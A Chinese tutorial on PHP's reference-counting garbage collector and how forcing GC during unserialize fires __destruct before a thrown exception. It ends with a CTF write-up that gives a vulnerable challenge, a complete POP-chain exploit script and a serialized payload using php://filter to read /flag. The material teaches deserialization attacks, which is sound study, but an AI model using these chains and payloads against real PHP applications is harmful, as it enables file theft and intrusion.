php中GC垃圾回收机制的利用
===============

什么是GC垃圾回收机制
-----------

在PHP中，使用`引用计数`和`回收周期`来自动管理内存对象的，当一个变量被设置为`NULL`，或者没有任何指针指向  
时，它就会被变成垃圾，被`GC`机制自动回收掉。  
那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被`GC`机制回收，在回收的过程中，**它会自动触发`_destruct`方法，而这也就是我们绕过抛出异常的关键点。**

上面说到PHP是使用`引用计数`来进行管理的，接下来简单说一下。

引用计数
----

> 每个 php 变量存在一个叫做 "zval" 的变量容器中。一个 zval 变量容器，除了包含变量的类型和值，还包括两个字节的额外信息。第一个是 "is\_ref", 是个 bool 值，用来标识这个变量是否是属于引用集合 (reference set). 通过这个字节，php 引擎才能把普通变量和引用变量区分开。由于 php 允许用户通过使用 &amp; 来使用自定义引用，zval 变量容器中还有一个内部引用计数机制，来优化内存使用。第二个额外字节是 "refcount", 用来表示指向这个 zval 变量容器的变量 (也称符号即 symbol) 个数

### 底层原理

#### zval

当一个变量被赋常量值时，就会生成一个zval变量容器

```php
// php 变量对于的c结构体
struct _zval_struct {

    zend_value value;
    union {
       ……
    } u1;
    union {
        ……
    } u2;
};
```

- u1 结构比较复杂，主要是用于识别变量类型
- u2 这里面大多都是辅助字段，变量内部功能的实现、提升缓存友好性

#### zend\_value

它也是结构体中内嵌的一个联合体

```php
typedef union _zend_value {

    zend_long         lval;//整形

    double            dval;//浮点型

    zend_refcounted  *counted;//获取不同类型的gc头部

    zend_string      *str;//string字符串

    zend_array       *arr;//数组

    zend_object      *obj;//对象

    zend_resource    *res;//资源

    zend_reference   *ref;//是否是引用类型

    // 忽略下面的结构，与我们讨论无关

    zend_ast_ref     *ast;
    zval             *zv;
    void             *ptr;
    zend_class_entry *ce;
    zend_function    *func;
    struct {
        ZEND_ENDIAN_LOHI(
            uint32_t w1,
            uint32_t w2)
    } ww;
} zend_value;
```

在 zval 的 value 中就记录了引用计数 zend\_refcounted \*counted 这个类型，我们的垃圾回收机制也是基于此的。

```php
typedef struct _zend_refcounted_h {
    uint32_t         refcount;          /* reference counter 32-bit */
    union {
        struct {
            ZEND_ENDIAN_LOHI_3(
                zend_uchar    type,
                zend_uchar    flags,    /* used for strings & objects */
                uint16_t      gc_info)  /* keeps GC root number (or 0) and color */
        } v;
        uint32_t type_info;
    } u;
} zend_refcounted_h;
```

所有的复杂类型的定义，开始的时候都是 zend\_refcounted\_h 结构，这个结构里除了引用计数以外，还有 GC 相关的结构。从而在做 GC 回收的时候，GC 不需要关心具体类型是什么，所有的它都可以当做 zend\_refcounted \* 结构来处理

### 引用计数原理

前面提到了zval这个变量容器中有两个字节的额外信息。第一个是 "`is_ref`"，第二个额外字节是 "`refcount`"。

- `is_ref`

`is_ref`是个bool值，用来标识这个变量是否是属于引用集合。通过这个字节，php引擎才能把普通变量和引用变量区分开来。由于php允许用户通过"&amp;"来使用自定义的引用，所以zval中还有一个内部引用计数机制，来进行优化内存。

- `refcount`

`refcount`用以表示指向这个zval变量容器的变量(也称符号即symbol)的个数。所有符号存在一个符号表当中，每个符号都有作用域。

**简单的来说，`is_ref`就是当有变量使用&amp;进行变量的引用，那么`refcount`的值就会加1；refcount就是有多少个变量一样用了相同的值。**

我们来看一个例子

```php
<?php
$a = "new string";
xdebug_debug_zval('a');//用于查看变量a的zval变量容器的内容
?>
```

```php
//输出
a: (refcount=1, is_ref=0)='new string'
```

在上面的示例中我们定义了一个变量，生成了一个类型为string和值为new string的便变量容器。对于上面提到的两个额外的字节is\_ref和`refcount`,首先不存在引用的变量值所以`is_ref`应当为false,false的布尔值为0，而refcount表示指向这个容器的变量个数，由于只有一个变量，因此值为1

下面我们来增加一个zval的引用计数

```php
<?php
$a = "new string";
$b = &$a;
xdebug_debug_zval('a');
?>
```

```php
a: (refcount=2, is_ref=1)='new string'
```

由于我们将变量a和变量b相关联，`is_ref`的值为true，php没有必要为变量b生成一个新的变量容器(也就是说不会复制已有的变量容器)，因此`refcount`字节的值为2

总的来说就是一个zval容器存放了两个变量a和b，就使得`refcount`字节为2

再来看一下容器销毁，也就是如何减少引用计数

变量容器在`refcount`变成0时就被销毁。它这个值是如何减少的呢，当函数执行结束或者对变量调用了unset()函数,`refcount`就会减1

```php
<?php
$a="new string"; 
$b =&$a;
$c =&$b;
xdebug_debug_zval('a');
unset($b,$c);
xdebug_debug_zval('a');
?>
```

按照我们上面所讲的，首次输出的`is_ref`应当为1，`refcount`应当为3。由于第二次输出之前使用了unset函数，将b和c变量删除了，因此，`is_ref`为0,`refcount`减为1

```php
a: (refcount=3, is_ref=1)='new string'
a: (refcount=1, is_ref=1)='new string'
```

拷贝复制
----

```php
$a = 'hello';
$b = $a;//$a赋值给$b的时候，$a的值并没有真的复制了一份
echo xdebug_debug_zval( 'a');//$a的引用计数为0
$a = 'world';//当我们修改$a的值为123的时候，这个时候就不得已进行复制，避免$b的值和$a的一样
echo xdebug_debug_zval( 'a');///$a的引用计数为0
```

用这个例子也能体现出 PHP 的拷贝机制，其实，当你把 $a 赋值给 $b 的时候，$a 的值并没有真的复制了一份，这样是对内存的极度不尊重，也是对时间复杂度的极度不尊重，计算机仅仅是将 $b 指向了 $a 的值而已，这就叫多快好省。那么，什么时候真正的发生复制呢？就是当我们修改 $a 的值为 123 的时候，这个时候就不得已进行复制，避免 $b 的值和 $a 的一样。

垃圾回收机制
------

> 当一个 zval 在被 unset 的时候、或者从一个函数中运行完毕出来（就是局部变量）的时候等等很多地方，都会产生 zval 与 zend\_value 发生断开的行为，这个时候 zend 引擎需要检测的就是 zend\_value 的 refcount 是否为 0，如果为 0，则直接 KO free 空出内容来。如果 zend\_value 的 recount 不为 0，这个 value 不能被释放，但是也不代表这个 zend\_value 是清白的，因为此 zend\_value 依然可能是个垃圾。

- 当 php 变量 $a 的 refcount=0 时，变量 $a 就会被垃圾回收
- 当 php 变量 $a 的 refcount&gt;0 时，变量 $a 但也可能被认为是垃圾

```php
$arr = [ 1 ];
$arr[] = &$arr;
unset( $arr );
```

这种情况下，zend\_value 不会能释放，但也不能放过它，不然一定会产生内存泄漏，所以这会儿 zend\_value 会被扔到一个叫做垃圾回收堆中，然后 zend 引擎会依次对垃圾回收堆中的这些 zend\_value 进行二次检测，检测是不是由于上述两种情况造成的 refcount 为 1 但是自身却确实没有人再用了，如果一旦确定是上述两种情况造成的，那么就会将 zend\_value 彻底抹掉释放内存。

GC在php反序列化中的应用
--------------

`GC`如果在PHP反序列化中生效，那它就会直接触发`_destruct`方法

### eg1

我们首先来看一个示例

```php
<?php
highlight_file(__FILE__); 
error_reporting(0); 
class test{ 
    public $num; 
    public function __construct($num) {
        $this->num = $num; echo $this->num."__construct"."</br>"; 
    }
    public function __destruct(){
        echo $this->num."__destruct()"."</br>"; 
    }
    }
$a = new test(1); 
$b = new test(2); 
$c = new test(3);
?>
```

![GC垃圾回收1.png](https://shs3.b.qianxin.com/attack_forum/2023/07/attach-da2f22bd0cdcca55ac2d22e98f5a762df6045377.png)

可以发现在正常的情况下，销毁方法都是最后执行的

我们尝试去主动触发GC机制

```php
<?php
highlight_file(__FILE__); 
error_reporting(0); 
class test{ 
    public $num; 
    public function __construct($num) {
        $this->num = $num; echo $this->num."__construct"."</br>"; 
    }
    public function __destruct(){
        echo $this->num."__destruct()"."</br>"; 
    }
    }
$a = new test(1);
unset($a);
$b = new test(2);
$c = new test(3);
?>
```

![](%E5%9B%BE%E7%89%87/GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6.png)

可以发现销毁方法提前执行了

### eg2

我们知道当对象为NULL时也可以触发\_\_destruct方法，所以我们这里的话来试一下反序列化一个数组，然后写入第一个索引为对象，将第二个赋值为`0`，看一下能否触发。

```php
<?php
show_source(__FILE__);
$flag = "flag";
class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}
$a = unserialize($_GET['1']);
throw new Exception('die');
```

这里在反序列化之后就抛出异常了，正常情况下时无法触发销毁方法的，我们按照上面所说的，首先反序列化一个数组

```php
<?php
show_source(__FILE__);

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}
$a=array(new B,0);

echo serialize($a);
```

输出

```php
a:2:{i:0;O:1:"B":0:{}i:1;i:0;}
//含义
//数组:长度为2::{int型:长度0;类:长度为1:类名为"B":值为0 int型:值为1：int型;值为0
```

我们尝试将第二个索引值设为空，就可以触发GC回收机制，因此我们可以修改一下反序列化的字符串

```php
a:2:{i:0;O:1:"B":0:{}i:0;i:0;}
```

我们再尝试一下反序列化

![GC回收机制2.png](https://shs3.b.qianxin.com/attack_forum/2023/07/attach-b8d753f9d8b31b10c657c64b1ccc9e6dfc8c8223.png)

发现成功能执行销毁方法了，这也是我们再反序列化中绕过异常的一种方法。

实战
--

### \[2023年第三届陕西省大学生网络安全技能大赛\]ezpop

在js文件中找到源码

```php
<?php
highlight_file(__FILE__);

class night
{
    public $night;

    public function __destruct(){
        echo $this->night . '哒咩哟';
    }
}

class day
{
    public $day;

    public function __toString(){
        echo $this->day->go();
    }

    public function __call($a, $b){
        echo $this->day->getFlag();
    }
}

class light
{
    public $light;

    public function __invoke(){
        echo $this->light->d();
    }
}

class dark
{
    public $dark;

    public function go(){
        ($this->dark)();
    }

    public function getFlag(){
        include(hacked($this->dark));
    }
}

function hacked($s) {
    if(substr($s, 0,1) == '/'){
        die('呆jio步');
    }
    $s = preg_replace('/\.\.*/', '.', $s);
    $s = urldecode($s);
    $s = htmlentities($s, ENT_QUOTES, 'UTF-8');
    return strip_tags($s);
}

$un = unserialize($_POST['‮⁦快给我传参⁩⁦pop']); // 
throw new Exception('seino');
```

exp:

```php
<?php
class night
{
 public $night;
}

class day
{
    public $day;
}

class light
{
    public $light;
}
class dark
{
    public $dark;
}
$a = new night();
$a -> night = new day();
$a -> night -> day = new dark();
$a -> night -> day -> dark = new light();
$a -> night -> day -> dark -> light = new day();
$a -> night -> day -> dark -> light -> day = new dark();
$a -> night -> day -> dark -> light -> day -> dark = 'php://filter/convert.base64-encode/resource=/flag';
//用filter伪协议读取来绕过hacked的过滤
$b=array($a,0); 
//利用phpGC垃圾回收机制绕过throw new Exception
echo serialize($b);
?>
```

我们来理顺一下上面这条pop链的构造过程，首先这条链子的终点为dark类中的getflag方法，里面存在文件包含，起点则是night类中的销毁方法，其中的一个比较关键的点就是使用echo来触发toString方法。

然后就是需要使用GC垃圾回收机制来绕过后面丢出来的一个报错，从而触发destruct方法

输出

```php
a:2:{i:0;O:5:"night":1:{s:5:"night";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";O:5:"light":1:{s:5:"light";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";s:49:"php://filter/convert.base64-encode/resource=/flag";}}}}}}i:1;i:0;}
```

需要将最后的i:1改成i:0，然后进行url编码就可以把链子打通了。